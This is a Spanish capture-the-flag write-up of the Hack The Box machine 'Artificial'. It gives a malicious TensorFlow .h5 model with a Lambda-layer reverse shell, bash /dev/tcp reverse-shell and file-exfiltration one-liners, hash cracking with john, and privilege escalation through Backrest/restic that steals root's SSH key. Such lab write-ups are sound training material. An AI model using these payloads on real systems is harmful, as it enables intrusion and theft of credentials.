---
title: Artificial - Easy (HTB)
permalink: /Artificial-HTB-Writeup/
tags:
  - Linux
  - Easy
  - AI
  - TensorFlow
  - "Hash Cracking"
  - Backrest
  - "SSH Local Port Forwarding"
  - "Credentials Leakage"
  - "Backups"
categories:
  - writeup
  - hacking
  - hackthebox
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
seo_tittle: Artificial - Easy (HTB)
seo_description: Construye un modelo de IA malicioso y abusa de configuraciones inseguras del servicio Backrest para vencer Artificial.
excerpt: Construye un modelo de IA malicioso y abusa de configuraciones inseguras del servicio Backrest para vencer Artificial.
header:
  overlay_image: /assets/images/headers/artificial-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/artificial-hackthebox.jpg
---
![image-center](/assets/images/posts/artificial-hackthebox.png)
{: .align-center}

**Habilidades:** TensorFlow Remote Code Execution, `SQLite` Database Enumeration, Hash Cracking, Backups Enumeration, `Backrest` Credentials Leakage, SSH Local Port Forwarding, Abusing `Backrest` -  Repository with Sensitive Files `(1)`, Remote Code Execution via `Restic` Flag `(2)` [Privilege Escalation]
{: .notice--info}

# Introducción

Artificial es una máquina Linux de dificultad `Easy` en HackTheBox que requiere explotar una funcionalidad para lograr ejecutar comandos en el sistema a través de un modelo malicioso de inteligencia artificial basado en TensorFlow, además de abusar de una mala configuración del servicio `Backrest` para conseguir archivos privilegiados y obtener control total.
<br>

# Reconocimiento
---
Enviaremos una traza ICMP para comprobar que la máquina víctima se encuentre activa

~~~ bash
ping -c 1 10.10.11.74                                                                                             
PING 10.10.11.74 (10.10.11.74): 56 data bytes
64 bytes from 10.10.11.74: icmp_seq=0 ttl=63 time=298.221 ms

--- 10.10.11.74 ping statistics ---
1 packets transmitted, 1 packets received, 0.0% packet loss
round-trip min/avg/max/stddev = 298.221/298.221/298.221/0.000 ms
~~~


## Nmap Scanning 

Comenzaremos lanzando un escaneo que se encargue de identificar puertos abiertos en la máquina víctima. Primeramente utilizaremos el protocolo TCP

~~~ bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.74 -oG openPorts

Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-25 10:53 -03
Nmap scan report for 10.10.11.74
Host is up (0.25s latency).
Not shown: 35045 closed tcp ports (reset), 30488 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 51.33 seconds
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grepable`
- `-v`: Ver el progreso del escaneo

Vemos dos servicios expuestos, `ssh` y `http`. Lanzaremos un segundo escaneo que intente identificar la versión y realice un pequeño reconocimiento de estos servicios

~~~ bash
nmap -p 22,80 -sVC 10.10.11.74 -oN services                   
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-25 10:55 -03
Nmap scan report for 10.10.11.74
Host is up (0.53s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7c:e4:8d:84:c5:de:91:3a:5a:2b:9d:34:ed:d6:99:17 (RSA)
|   256 83:46:2d:cf:73:6d:28:6f:11:d5:1d:b4:88:20:d6:7c (ECDSA)
|_  256 e3:18:2e:3b:40:61:b4:59:87:e8:4a:29:24:0f:6a:fc (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://artificial.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.61 seconds
~~~

- `-p`: Especificar puertos
- `-sV`: Identificar la versión del servicio 
- `-sC`: Uso de scripts de reconocimiento
- `-oN`: Exportar la salida en formato normal

El servidor `http` que ejecuta `nginx 1.18.0`, en cuanto a versiones, no encontraremos información muy útil en cuanto a vulnerabilidades conocidas que podamos aprovechar


## Web Analysis

Antes de visitar la web, podemos lanzar un escaneo de las tecnologías web que el servidor pueda estar utilizando para gestionar el contenido

~~~ bash
whatweb http://10.10.11.74

http://10.10.11.74 [302 Found] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.74], RedirectLocation[http://artificial.htb/], Title[302 Found], nginx[1.18.0]
ERROR Opening: http://artificial.htb/ - no address for artificial.htb
~~~

Al igual que en la captura de `nmap`, podemos ver que el servidor web intenta aplicar una redirección hacia `artificial.htb`.

Agregaremos este dominio a nuestro archivo `/etc/hosts` para una resolución DNS correcta

``` bash
echo '10.10.11.74 artificial.htb' | sudo tee -a /etc/hosts

10.10.11.74 artificial.htb
```

Al visitar `artificial.htb`, veremos la siguiente web

![image-center](/assets/images/posts/artificial-1-hackthebox.png)
{: .align-center}

Podremos registrar una cuenta desde la ruta `/register`

![image-center](/assets/images/posts/artificial-2-hackthebox.png)
{: .align-center}

### `Dockerfile`

Al iniciar sesión, veremos una funcionalidad que nos permite subir modelos de IA a la web. Nos entregan un archivo `requirements.txt` y un archivo `Dockerfile` para desplegar rápidamente el modelo

![image-center](/assets/images/posts/artificial-3-hackthebox.png)
{: .align-center}

Descargaremos ambos archivos en nuestro directorio de trabajo

``` bash
wget http://artificial.htb/static/Dockerfile
wget http://artificial.htb/static/requirements.txt
```

Al inspeccionar el `Dockerfile`, notaremos que se utiliza la librería `tensorflow` para construir el modelo de IA

~~~ bash
FROM python:3.8-slim

WORKDIR /code

RUN apt-get update && \
    apt-get install -y curl && \
    curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
    rm -rf /var/lib/apt/lists/*

RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl

ENTRYPOINT ["/bin/bash"]
~~~

Dentro del archivo `requirements.txt` veremos las dependencias necesarias para construir el modelo, la cual corresponde a la versión `2.13.1` de `tensorflow-cpu`

~~~ bash
tensorflow-cpu==2.13.1
~~~
<br>


# Intrusión / Explotación
---
## TensorFlow Remote Code Execution

Los modelos de redes neuronales se pueden guardar con capas lambda de `Keras`. La capa `Keras` en TensorFlow está diseñada para permitir la ejecución de código `python` como parte del grafo del modelo.

> `Keras` es una biblioteca de código abierto en Python que funciona como una interfaz de alto nivel para crear y entrenar redes neuronales artificiales.
{: .notice--info}

Es posible guardar cualquier código en estas capas, por lo que se puede incrustar código malicioso en un modelo que se ejecutará en la máquina de la víctima cuando el modelo sea utilizado.

> Nota que al intentar cargar un archivo cualquiera, el servidor espera un archivo con extensión `.h5`
{: .notice--info}
### Malicious TensorFlow Model

Desplegaremos un contenedor con `docker` para construir el modelo malicioso desde un entorno desechable. Primeramente hacemos un `pull` de la imagen de `python` utilizada en el archivo `Dockerfile`

~~~ bash
docker pull python:3.8-slim
~~~

Descargaremos la versión de `tensorflow` utilizada en el archivo `Dockerfile`

``` bash
curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl
```

Iniciaremos un contenedor utilizando la imagen que recién descargamos

``` bash
docker run -it -v $(pwd):/tmp python:3.8-slim bash

# Veremos el prompt para el usuario root
root@e484e9c8150b:/# 
```

Como utilizamos el directorio actual para montarlo en la ruta `/tmp` dentro del contenedor, dispondremos del paquete de `tensorflow`

``` bash
root@e484e9c8150b:/# cd /tmp
root@e484e9c8150b:/tmp# ls
Dockerfile  requirements.txt  tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl
```

Procederemos con la instalación de `tensorflow` dentro del contenedor

``` bash
root@e484e9c8150b:/tmp# pip3 install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl
```

Utilizaremos la siguiente prueba de concepto para ejecutar comandos cuando el servidor interactúe con nuestro modelo

``` python
import tensorflow as tf

def exploit(x):
    import os
	    os.system("bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```

### Exploiting

Construiremos un modelo malicioso que ejecute una reverse shell iniciando una conexión hacia nuestra IP por un puerto determinado. 

En este caso podemos omitir el uso de herramientas de edición de texto (aunque si necesitas usar alguna por comodidad, puedes instalar después de ejecutar `apt update` dentro del contenedor)

``` bash
root@e484e9c8150b:/tmp# cat > poc.py << EOF
import tensorflow as tf

def exploit(x):
    import os
    os.system("bash -c 'bash -i >& /dev/tcp/10.10.16.123/443 0>&1'")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
EOF
```

Ejecutaremos el script dentro del contenedor para generar el archivo `exploit.h5`

``` bash
root@e484e9c8150b:/tmp# python3.8 poc.py
```

Como la ruta `/tmp` del contenedor está sincronizada con la ruta, dispondremos del archivo `exploit.h5` en local.

Iniciaremos un listener por el puerto que elegimos en el payload, luego subiremos nuestro exploit a la web

``` bash
nc -lvnp 443
```

![image-center](/assets/images/posts/artificial-4-hackthebox.png)
{: .align-center}

Para iniciar la conexión, haremos clic en `View Predictions` una vez hayamos cargado el modelo

![image-center](/assets/images/posts/artificial-5-hackthebox.png)
{: .align-center} 


## Shell as `app`

Desde nuestro listener recibiremos una conexión como el usuario `app`

~~~ bash
nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.16.123] from (UNKNOWN) [10.10.11.74] 35304
/bin/sh: 0: can't access tty; job control turned off
$ whoami
app
~~~

### TTY Treatment

Aplicaremos un tratamiento de la `tty` para poder operar con una consola más cómoda, donde podamos presionar `Ctrl+C` sin que la shell se vaya pal carajo

~~~ bash
$ script /dev/null -c bash
Script started, file is /dev/null
app@artificial:~/app$ ^Z
[1]  + 153844 suspended  nc -lvnp 443
root@parrot exploits # stty raw -echo;fg        
[1]  + 153844 continued  nc -lvnp 443
                                     reset xterm
app@artificial:~/app$ export TERM=xterm
app@artificial:~/app$ stty rows 44 columns 184
~~~


## Users

Consultaremos rápidamente el archivo `/etc/hosts` para ver a los usuarios válidos en el sistema además de `root`

``` bash
app@artificial:~/app$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
gael:x:1000:1000:gael:/home/gael:/bin/bash
app:x:1001:1001:,,,:/home/app:/bin/bash
```


## `SQLite` Database Enumeration

Dentro de los archivos de la aplicación web, encontraremos uno que corresponde a una base de datos `sqlite3`

~~~ bash
app@artificial:~/app$ ls
app.py  instance  models  __pycache__  static  templates
app@artificial:~/app$ ls instance/
users.db

app@artificial:~/app$ file instance/users.db
instance/users.db: SQLite 3.x database, last written using SQLite version 3031001
~~~

Podemos utilizar el binario de `sqlite3` para enumerar la base de datos directamente ejecutando consultas de las siguiente manera

~~~ bash
app@artificial:~/app$ sqlite3 instance/users.db '.tables'
model  user 
~~~

Vemos que existe una tabla llamada `user`. Consultaremos todos los registros aplicando un filtro para evitar ver usuarios externos a la web (para evitar usuarios `junk`)

~~~ bash
app@artificial:~/app$ sqlite3 instance/users.db 'select * from user' | grep artificial.htb

1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8
2|mark|mark@artificial.htb|0f3d8c76530022670f1c6029eed09ccb
3|robert|robert@artificial.htb|b606c5f5136170f15444251665638b36
4|royer|royer@artificial.htb|bc25b1f80f544c0ab451c02a3dca9fc6
5|mary|mary@artificial.htb|bf041041e57f1aff3be7ea1abd6129d0
~~~


## Hash Cracking

Veremos distintas contraseñas cifradas, las guardaremos en un archivo (por ejemplo, `hashes.txt`) e intentaremos descifraras para verlas en texto claro empleando herramientas como `john`, `hashcat` o alguna herramienta online

~~~ bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt --format=Raw-MD5

Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 5 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
mattp005numbertwo (?)     
marwinnarak043414036 (?)     
2g 0:00:00:00 DONE (2025-10-13 19:20) 2.531g/s 18156Kp/s 18156Kc/s 68988KC/s  fuckyooh21..*7¡Vamos!
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
~~~

- En este caso he utilizado el formato `MD5`, aunque en este caso `john` identificará automáticamente el algoritmo


## Shell as `gael`

Como vimos que el usuario `gael` es válido además de `app` y `root`, utilizaremos esta contraseña para acceder por `ssh` como `gael`

~~~ bash
ssh gael@artificial.htb
gael@artificial.htb\'s password: 
...
<SNIP>
...

gael@artificial:~$ 
gael@artificial:~$ export TERM=xterm
~~~

Ya podremos ver la flag del usuario sin privilegios

~~~ bash
gael@artificial:~$ cat user.txt 
b49...
~~~
<br>


# Escalada de Privilegios
---
## Backups Enumeration

Ejecutando el comando `id`, notaremos que pertenecemos al grupo `sysadm`.

> El objetivo principal de un usuario en el grupo `sysadm` es poder realizar **tareas de configuración, mantenimiento y monitoreo** a nivel de sistema, generalmente sin necesidad de tener el poder absoluto del usuario `root` para cada acción.
{: .notice--info}

~~~ bash
gael@artificial:~$ id
uid=1000(gael) gid=1000(gael) groups=1000(gael),1007(sysadm)
~~~

Dentro del directorio `/var/backups`, se encuentra un archivo comprimido que parece ser una copia de seguridad del servicio `Backrest`

~~~ bash
gael@artificial:~$ ls -l /var/backups/
total 51220
-rw-r--r-- 1 root root      38602 Jun  9 10:48 apt.extended_states.0
-rw-r--r-- 1 root root       4253 Jun  9 09:02 apt.extended_states.1.gz
-rw-r--r-- 1 root root       4206 Jun  2 07:42 apt.extended_states.2.gz
-rw-r--r-- 1 root root       4190 May 27 13:07 apt.extended_states.3.gz
-rw-r--r-- 1 root root       4383 Oct 27  2024 apt.extended_states.4.gz
-rw-r--r-- 1 root root       4379 Oct 19  2024 apt.extended_states.5.gz
-rw-r--r-- 1 root root       4367 Oct 14  2024 apt.extended_states.6.gz
-rw-r----- 1 root sysadm 52357120 Mar  4  2025 backrest_backup.tar.gz
~~~

### File Transfering

Iniciaremos un listener en nuestra máquina con el fin de transferirnos la copia de seguridad

~~~ bash
nc -lvnp 443 > backrest_backup.tar.gz                  
listening on [any] 443 ...
connect to [10.10.16.123] from (UNKNOWN) [10.10.11.74] 45648
~~~

Desde la máquina víctima, ejecutaremos `cat` y reenviaremos la salida hacia nuestra IP

~~~ bash
gael@artificial:/var/backups$ cat backrest_backup.tar.gz > /dev/tcp/10.10.16.123/443
~~~

Podemos comprobar la integridad del archivo calculando un hash MD5 equivalente a su contenido

~~~ bash
# Víctima
gael@artificial:~$ md5sum /var/backups/backrest_backup.tar.gz
cafb07ed883d8528f4000eaacc9492f4  /var/backups/backrest_backup.tar.gz

# Atacante
md5sum backrest_backup.tar.gz                    
cafb07ed883d8528f4000eaacc9492f4  backrest_backup.tar.gz
~~~

Para descomprimir, usaremos la herramienta `tar`

~~~ bash
tar -xf backrest_backup.tar.gz
~~~


## `Backrest` Credentials Leakage

Si listamos todos los archivos del directorio `backrest`, incluyendo ocultos, veremos un archivo `config.json`

``` bash
tree . -a
      
.
├── .config
│   └── backrest
│       └── config.json
├── backrest
├── install.sh
├── jwt-secret
├── oplog.sqlite
├── oplog.sqlite-shm
├── oplog.sqlite-wal
├── oplog.sqlite.lock
├── processlogs
│   └── backrest.log
├── restic
└── tasklogs
    ├── .inprogress
    ├── logs.sqlite
    ├── logs.sqlite-shm
    └── logs.sqlite-wal

6 directories, 13 files
```

Dentro de este archivo se encuentran las credenciales de acceso, donde vemos una contraseña que parece estar encriptada

``` bash
cat .config/backrest/config.json
Password:
{
  "modno": 2,
  "version": 4,
  "instance": "Artificial",
  "auth": {
    "disabled": false,
    "users": [
      {
        "name": "backrest_root",
        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
      }
    ]
  }
}
```

El campo que corresponde a la contraseña es bastante humilde y nos da una pista, se trata del algoritmo `bcrypt`. Aunque por su apariencia, parece más bien `base64`

~~~ bash
echo 'JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP' | base64 -d;echo
$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO
~~~

### Hash Cracking

El hash resultante si parece del formato `bcrypt`, intentaremos descifrarlo mediante un ataque de fuerza bruta basado en el diccionario `rockyou.txt`

~~~ bash
john --wordlist=/usr/local/share/wordlists/rockyou.txt hash.txt           
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Press 'q' or Ctrl-C to abort, almost any other key for status
!@#$%^           (?)
1g 0:00:03:37 100% 0.004598g/s 24.69p/s 24.69c/s 24.69C/s !@#$%^..sapito
Use the "--show" option to display all of the cracked passwords reliably
Session completed
~~~

Si hacemos un poco de investigación en el repositorio oficial en [`Github`](https://github.com/garethgeorge/backrest), sabremos que el servicio `Backrest` se ejecuta por defecto en el puerto `9898`

``` bash
-bash-5.0$ ss -tunl  | grep LISTEN
tcp    LISTEN  0       2048         127.0.0.1:5000        0.0.0.0:*
tcp    LISTEN  0       4096         127.0.0.1:9898        0.0.0.0:*
tcp    LISTEN  0       511            0.0.0.0:80          0.0.0.0:*
tcp    LISTEN  0       4096     127.0.0.53%lo:53          0.0.0.0:*
tcp    LISTEN  0       128            0.0.0.0:22          0.0.0.0:*
tcp    LISTEN  0       511               [::]:80             [::]:*
tcp    LISTEN  0       128               [::]:22             [::]:* 
```


## SSH Local Port Forwarding

Iniciaremos un túnel SSH que reenvíe el puerto por el cual se ejecuta el servicio `backrest` para que podamos alcanzarlo desde nuestra máquina

~~~ bash
ssh gael@artificial.htb -fN -L 9898:127.0.0.1:9898
~~~

- `-f`: Ejecutar el proceso en segundo plano
- `-N`: No iniciar una sesión, en este caso solo nos interesa reenviar puertos 
- `-L`: Reenvío de puertos local


## Abusing `Backrest`

Una vez establezcamos el túnel, iniciaremos sesión con las credenciales que encontramos en el archivo `config.json` en el servicio `backrest` que ahora es accesible desde nuestro puerto `9898`

![image-center](/assets/images/posts/artificial-6-hackthebox.png)
{: .align-center}

Al acceder al servicio, veremos la siguiente web, donde se explica brevemente el funcionamiento de la herramienta

![image-center](/assets/images/posts/artificial-7-hackthebox.png)
{: .align-center}

### 1 - Repository with Sensitive Files

Iniciaremos un repositorio haciendo clic en `Add Repo`, como el servicio lo ejecuta el usuario `root`, podríamos intentar cargar archivos privilegiados (como el directorio `.ssh` donde se encuentra la clave privada del usuario `root`)

![image-center](/assets/images/posts/artificial-8-hackthebox.png)
{: .align-center}

Una vez el repositorio esté creado, podremos iniciar un nuevo plan desde `Plans` > `Add Plan`. Añadiremos el repositorio que creamos a este plan

![image-center](/assets/images/posts/artificial-9-hackthebox.png)
{: .align-center}

Cuando tengamos nuestro plan preparado, podemos iniciar una copia de seguridad haciendo clic en `Backup Now`

![image-center](/assets/images/posts/artificial-10-hackthebox.png)
{: .align-center}

Veremos que se genera una nueva copia de seguridad con la ruta que especificamos, podemos hacer una restauración de la siguiente manera

![image-center](/assets/images/posts/artificial-11-hackthebox.png)
{: .align-center}

Al restaurar la copia, podremos descargar el archivo desde el siguiente enlace

![image-center](/assets/images/posts/artificial-12-hackthebox.png)
{: .align-center}

Se nos descargará un archivo comprimido `.tar.gz` que contiene el archivo que solicitamos

~~~ bash
tar -tvf archive-2025-10-14-04-03-41.tar.gz                      
-rw------- 0/0            2602 2024-10-15 23:17 id_rsa
~~~

Ya con la clave privada del usuario `root`, podremos conectarnos a la máquina sin proporcionar contraseña

~~~ bash
tar -xf archive-2025-10-14-04-03-41.tar.gz                     
ssh -i id_rsa root@artificial.htb
...
<SNIP>
...

root@artificial:~# id
uid=0(root) gid=0(root) groups=0(root)
root@artificial:~# export TERM=xterm
~~~

### 2 - Remote Code Execution via `Restic` Flag

Iniciaremos un listener en un puerto por el cual esperaremos recibir una consola

``` bash
nc -lvnp 443
```

En la máquina víctima, crearemos un recurso de `bash` que inicia una reverse shell hacia nuestra IP por el puerto en el cual está a la escucha

``` bash
gael@artificial:~$ cat << EOF > /tmp/rev 
> #!/bin/bash
> bash -c 'bash -i >& /dev/tcp/10.10.X.X/443 0>&1'
> EOF
```

Una vez hayamos creado, le asignaremos permisos de ejecución para evitar conflictos de permisos

``` bash
gael@artificial:~$ chmod +x /tmp/rev
```

Para iniciar la ejecución, podemos usar la siguiente sintaxis

``` bash
ls --password-command /tmp/rev
```

![image-center](/assets/images/posts/artificial-13-hackthebox.png)
{: .align-center}

Desde nuestro listener recibiremos la conexión como el usuario que ejecuta el servicio web, o sea, el usuario `root`

``` bash
Connection from 10.10.11.74:42628
bash: cannot set terminal process group (4202): Inappropriate ioctl for device
bash: no job control in this shell
root@artificial:/# 
```

Ya podremos ver la última flag ubicada en el directorio `/root`

~~~ bash
root@artificial:~# cat root.txt 
ca9...
~~~

Gracias por leer, a continuación te dejo la cita del día.

> The heart has its reasons which reason knows not of.
> — Blaise Pascal
{: .notice--info}